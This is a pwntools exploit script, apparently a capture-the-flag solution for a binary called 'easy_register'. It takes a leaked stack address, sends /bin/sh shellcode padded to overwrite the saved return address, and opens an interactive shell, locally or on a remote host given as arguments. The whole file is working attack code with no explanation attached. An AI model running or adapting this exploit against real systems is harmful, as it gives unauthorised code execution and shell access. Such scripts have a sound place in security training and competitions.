#!/usr/bin/env python3
from pwn import *

exe = './easy_register'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript above
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

p = start()

shellcode = asm(shellcraft.linux.sh())

p.recvuntil(b'listing at ')
stack_leak = int(p.recv(14).decode(), 16)
p.recvuntil(b'>')

payload = shellcode + b'A' * (80 + 8 - len(shellcode)) + p64(stack_leak)
p.sendline(payload)
p.interactive()